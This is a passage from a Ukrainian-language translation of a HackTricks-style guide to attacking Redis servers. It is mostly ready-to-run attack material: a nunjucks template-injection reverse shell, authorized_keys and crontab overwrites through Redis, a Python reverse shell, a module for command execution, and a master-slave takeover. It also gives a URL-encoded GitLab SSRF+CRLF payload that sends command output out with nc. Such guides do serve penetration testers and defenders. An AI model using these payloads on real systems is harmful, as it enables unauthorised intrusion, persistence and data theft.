–Ø–∫—â–æ –≤–∏–Ω–∏–∫–ª–∞ –ø–æ–º–∏–ª–∫–∞ –¥–æ—Å—Ç—É–ø—É –¥–æ –≤–µ–±-–æ–±–æ–ª–æ–Ω–∫–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—á–∏—Å—Ç–∏—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö –ø—ñ—Å–ª—è —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è —Ç–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ —â–µ —Ä–∞–∑, –Ω–µ –∑–∞–±—É–¥—å—Ç–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö.

### –®–∞–±–ª–æ–Ω –≤–µ–±-–æ–±–æ–ª–æ–Ω–∫–∏

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –¥–µ—è–∫–∏–π —Ñ–∞–π–ª html-—à–∞–±–ª–æ–Ω—É, —è–∫–∏–π –±—É–¥–µ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–∏–π —à–∞–±–ª–æ–Ω–Ω–∏–º –¥–≤–∏–∂–∫–æ–º, —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–ª—ñ–¥—É—é—á–∏ –∑–∞ [**—Ü—ñ—î—é —Å—Ç–∞—Ç—Ç–µ—é**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–ø—Ä–æ–≤–∞–¥–∏–≤ **rev shell –≤ html**, —è–∫–∏–π —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î—Ç—å—Å—è **—à–∞–±–ª–æ–Ω–Ω–∏–º –¥–≤–∏–∂–∫–æ–º nunjucks:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–¥–µ–∫—ñ–ª—å–∫–∞ —à–∞–±–ª–æ–Ω–Ω–∏—Ö –¥–≤–∏–∂–∫—ñ–≤ –∫–µ—à—É—é—Ç—å** —à–∞–±–ª–æ–Ω–∏ –≤ **–ø–∞–º'—è—Ç—ñ**, —Ç–æ–º—É –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ —ó—Ö –ø–µ—Ä–µ–∑–∞–ø–∏—à–µ—Ç–µ, –Ω–æ–≤–∏–π –Ω–µ –±—É–¥–µ **–≤–∏–∫–æ–Ω–∞–Ω–∏–π**. –£ —Ü–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –∞–±–æ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫ –∑–∞–ª–∏—à–∏–≤ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∞–∫—Ç–∏–≤–Ω–∏–º, –∞–±–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ DoS –Ω–∞ —Å–ª—É–∂–±—É (—ñ –æ—á—ñ–∫—É–≤–∞—Ç–∏, —â–æ –≤–æ–Ω–∞ –±—É–¥–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω–∞).
{% endhint %}

### SSH

–ü—Ä–∏–∫–ª–∞–¥ [–∑–≤—ñ–¥—Å–∏](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

–ë—É–¥—å –ª–∞—Å–∫–∞, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç **`config get dir`** –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏—Å—è –ø—ñ—Å–ª—è —ñ–Ω—à–∏—Ö –∫–æ–º–∞–Ω–¥ –≤—Ä—É—á–Ω—É. –†–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ–Ω–∞—Ç–∏ –π–æ–≥–æ –ø–µ—Ä—à–∏–º, –æ–¥—Ä–∞–∑—É –ø—ñ—Å–ª—è –≤—Ö–æ–¥—É –≤ Redis. –£ –≤–∏–≤–æ–¥—ñ **`config get dir`** –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–¥–æ–º–∞—à–Ω—é** –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ redis** (–∑–∞–∑–≤–∏—á–∞–π _/var/lib/redis_ –∞–±–æ _/home/redis/.ssh_), —ñ –∑–Ω–∞—é—á–∏ —Ü–µ, –≤–∏ –∑–Ω–∞—î—Ç–µ, –∫—É–¥–∏ –º–æ–∂–Ω–∞ –∑–∞–ø–∏—Å–∞—Ç–∏ —Ñ–∞–π–ª `authenticated_users` –¥–ª—è –¥–æ—Å—Ç—É–ø—É —á–µ—Ä–µ–∑ ssh **–∑ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º redis**. –Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ –¥–æ–º–∞—à–Ω—é –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é —ñ–Ω—à–æ–≥–æ –¥—ñ–π—Å–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –¥–µ —É –≤–∞—Å —î –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º:

1. –ó–≥–µ–Ω–µ—Ä—É–π—Ç–µ –ø–∞—Ä—É –∫–ª—é—á—ñ–≤ ssh public-private –Ω–∞ —Å–≤–æ—î–º—É –∫–æ–º–ø'—é—Ç–µ—Ä—ñ: **`ssh-keygen -t rsa`**
2. –ó–∞–ø–∏—à—ñ—Ç—å –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á —É —Ñ–∞–π–ª: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. –Ü–º–ø–æ—Ä—Ç—É–π—Ç–µ —Ñ–∞–π–ª –≤ Redis: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. –ó–±–µ—Ä–µ–∂—ñ—Ç—å –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á —É —Ñ–∞–π–ª—ñ **authorized\_keys** –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ Redis:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. –ù–∞—Ä–µ—à—Ç—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ **ssh** –Ω–∞ **—Å–µ—Ä–≤–µ—Ä Redis** –∑ –ø—Ä–∏–≤–∞—Ç–Ω–∏–º –∫–ª—é—á–µ–º: **ssh -i id\_rsa redis@10.85.0.52**

**–¶—é —Ç–µ—Ö–Ω—ñ–∫—É –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–æ —Ç—É—Ç:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
–û—Å—Ç–∞–Ω–Ω—ñ–π –ø—Ä–∏–∫–ª–∞–¥ –¥–ª—è Ubuntu, –¥–ª—è **Centos**, –≤–∏—â–µ–∑–∞–∑–Ω–∞—á–µ–Ω—É –∫–æ–º–∞–Ω–¥—É —Å–ª—ñ–¥ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

–¶–µ–π –º–µ—Ç–æ–¥ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∑–∞—Ä–æ–±—ñ—Ç–∫—É –±—ñ—Ç–∫–æ—ó–Ω—ñ–≤: [yam](https://www.v2ex.com/t/286981#reply14)

### –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–æ–¥—É–ª—è Redis

1. –î–æ—Ç—Ä–∏–º—É—é—á–∏—Å—å —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ–π –∑ [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) –≤–∏ –º–æ–∂–µ—Ç–µ **—Å–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –º–æ–¥—É–ª—å Redis –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –∫–æ–º–∞–Ω–¥**.
2. –ü–æ—Ç—ñ–º –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —è–∫–æ—Å—å **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π** –º–æ–¥—É–ª—å
3. **–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π –º–æ–¥—É–ª—å** –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `MODULE LOAD /path/to/mymodule.so`
4. **–ü–µ—Ä–µ–ª—ñ–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏—Ö –º–æ–¥—É–ª—ñ–≤** –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è: `MODULE LIST`
5. **–í–∏–∫–æ–Ω–∞–π—Ç–µ** **–∫–æ–º–∞–Ω–¥–∏**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. –í—ñ–¥–∫–ª—é—á—ñ—Ç—å –º–æ–¥—É–ª—å –≤ –±—É–¥—å-—è–∫–∏–π –º–æ–º–µ–Ω—Ç: `MODULE UNLOAD mymodule`

### –û–±—Ö—ñ–¥ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ LUA

[**–¢—É—Ç**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) –º–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ Redis –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–æ–º–∞–Ω–¥—É **EVAL** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **Lua-–∫–æ–¥—É –≤ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ**. –£ –∑–∞–∑–Ω–∞—á–µ–Ω–æ–º—É –ø–æ—Å—Ç—ñ –º–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, **—è–∫ —Ü–µ –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—é **dofile**, –∞–ª–µ [–∑–¥–∞—î—Ç—å—Å—è](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) —Ü–µ –≤–∂–µ –Ω–µ –º–æ–∂–ª–∏–≤–æ. –£ –±—É–¥—å-—è–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–æ–±—ñ–π—Ç–∏ –ø—ñ—Å–æ—á–Ω–∏—Ü—é Lua**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ** –∫–æ–º–∞–Ω–¥–∏ –≤ —Å–∏—Å—Ç–µ–º—ñ. –¢–∞–∫–æ–∂, –∑ —Ç–æ–≥–æ –∂ –ø–æ—Å—Ç–∞ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –¥–µ—è–∫—ñ **–≤–∞—Ä—ñ–∞–Ω—Ç–∏ —Å–ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—è DoS**.

–î–µ—è–∫—ñ **CVE –¥–ª—è –≤–∏—Ö–æ–¥—É –∑ LUA**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### –ú–æ–¥—É–ª—å –ú–∞–π—Å—Ç–µ—Ä-–°–ª–µ–π–≤

–ú–∞–π—Å—Ç–µ—Ä Redis –≤—Å—ñ –æ–ø–µ—Ä–∞—Ü—ñ—ó –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—é—Ç—å—Å—è –∑ —Ä–µ–¥–∏—Å–æ–º-—Å–ª–µ–π–≤–æ–º, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –º–∏ –º–æ–∂–µ–º–æ —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏ —É—Ä–∞–∑–ª–∏–≤–∏–π —Ä–µ–¥—ñ—Å —è–∫ —Ä–µ–¥—ñ—Å-—Å–ª–µ–π–≤, –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –¥–æ –º–∞–π—Å—Ç–µ—Ä-—Ä–µ–¥—ñ—Å—É, —è–∫–∏–π –º–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é—î–º–æ, —Ç–æ–¥—ñ –º–∏ –º–æ–∂–µ–º–æ –≤–≤–æ–¥–∏—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –¥–æ –Ω–∞—à–æ–≥–æ –≤–ª–∞—Å–Ω–æ–≥–æ —Ä–µ–¥—ñ—Å—É.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF —Ä–æ–∑–º–æ–≤–∞ –∑ Redis

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç **—á—ñ—Ç–∫–∏–º —Ç–µ–∫—Å—Ç–æ–º** **–¥–æ Redis**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ **—Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –Ω–∏–º**, –æ—Å–∫—ñ–ª—å–∫–∏ Redis –±—É–¥–µ —á–∏—Ç–∞—Ç–∏ –∑–∞–ø–∏—Ç –ø–æ —Ä—è–¥–∫–∞—Ö —ñ –ø—Ä–æ—Å—Ç–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –ø–æ–º–∏–ª–∫–∞–º–∏ –Ω–∞ —Ä—è–¥–∫–∏, —è–∫—ñ –≤—ñ–Ω –Ω–µ —Ä–æ–∑—É–º—ñ—î:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
–û—Ç–∂–µ, —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **—É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å SSRF** –Ω–∞ –≤–µ–±-—Å–∞–π—Ç—ñ —ñ –º–æ–∂–µ—Ç–µ **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏** –¥–µ—è–∫—ñ **–∑–∞–≥–æ–ª–æ–≤–∫–∏** (–º–æ–∂–ª–∏–≤–æ, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ CRLF) –∞–±–æ **POST-–ø–∞—Ä–∞–º–µ—Ç—Ä–∏**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ –≤ Redis.

### –ü—Ä–∏–∫–ª–∞–¥: Gitlab SSRF + CRLF –Ω–∞ Shell

–£ **Gitlab11.4.7** –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ **—É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å SSRF** —Ç–∞ **CRLF**. **–£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å SSRF** –±—É–ª–∞ –≤ **—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—ñ —ñ–º–ø–æ—Ä—Ç—É –ø—Ä–æ–µ–∫—Ç—É –∑ URL-–∞–¥—Ä–µ—Å–∏** –ø—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É —Ç–∞ –¥–æ–∑–≤–æ–ª—è–ª–∞ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥–æ–≤—ñ–ª—å–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å —É —Ñ–æ—Ä–º—ñ \[0:0:0:0:0:ffff:127.0.0.1] (—Ü–µ –¥–æ–∑–≤–æ–ª–∏—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ 127.0.0.1), –∞ **—É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å CRLF** –±—É–ª–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –ø—Ä–æ—Å—Ç–æ **–¥–æ–¥–∞–≤–∞–Ω–Ω—è–º —Å–∏–º–≤–æ–ª—ñ–≤ %0D%0A** –¥–æ **URL**.

–û—Ç–∂–µ, –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º–∏ —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏ –¥–ª—è —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–æ–º Redis**, —è–∫–∏–π **–∫–µ—Ä—É—î —á–µ—Ä–≥–∞–º–∏** –∑ **gitlab** —Ç–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º–∏ —á–µ—Ä–≥–∞–º–∏ –¥–ª—è **–æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É**. –ü–∞–∫–µ—Ç –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —á–µ—Ä–≥–æ—é Redis:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
–Ü –∑–∞–ø–∏—Ç **URL encode**, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ **SSRF** —Ç–∞ **CRLF** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `whoami` —Ç–∞ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –≤–∏–≤–æ–¥—É —á–µ—Ä–µ–∑ `nc`, –º–∞—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤–∏–≥–ª—è–¥:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_–ó —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ (—è–∫ –¥–ª—è –∞–≤—Ç–æ—Ä–∞_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)_, –∑–≤—ñ–¥–∫–∏ –±—É–ª–∞ –≤–∑—è—Ç–∞ —Ü—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è), –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –ø—Ä–∞—Ü—é–≤–∞–ª–∞ –∑ —Å—Ö–µ–º–æ—é `git`, –∞ –Ω–µ –∑ —Å—Ö–µ–º–æ—é `http`._

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –±–∞–≥–∞–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ –•–∞–∫—ñ–Ω–≥—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ –•–∞–∫—ñ–Ω–≥ —É –†–µ–∞–ª—å–Ω–æ–º—É –ß–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –û–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –∑–∞–ø—É—Å–∫—ñ–≤ –±–∞–≥ –±–∞—É–Ω—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ —Ç–æ–ø–æ–≤–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.**

</details>
